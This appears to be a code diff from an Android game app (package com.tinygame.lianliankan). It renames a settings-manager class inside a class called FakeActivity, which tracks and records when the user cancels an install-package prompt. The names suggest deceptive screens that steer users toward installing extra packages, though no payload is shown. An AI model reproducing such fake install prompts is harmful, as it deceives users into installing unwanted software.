@@ -5,7 +5,7 @@ import android.content.Intent;
 import android.net.Uri;
 import android.os.Bundle;
 import android.view.Window;
-import com.xstd.qm.setting.SettingManager;
+import com.xstd.qm.setting.MainSettingManager;
 import com.tinygame.lianliankan.R;
 
 import java.io.File;
@@ -56,8 +56,8 @@ public class FakeActivity extends Activity {
 //                        Toast.makeText(FakeActivity.this, "Install Package cancel btn click, count = " + AppRuntime.CANCEL_COUNT, Toast.LENGTH_SHORT).show();
                 }
                 AppRuntime.INSTALL_PACKAGE_TOP_SHOW.set(false);
-                SettingManager.getInstance().setCancelInstallReserve(true);
-                SettingManager.getInstance().setInstallChanged(true);
+                MainSettingManager.getInstance().setCancelInstallReserve(true);
+                MainSettingManager.getInstance().setInstallChanged(true);
                 Utils.saveExtraInfo("左install");
                 finish();
             }
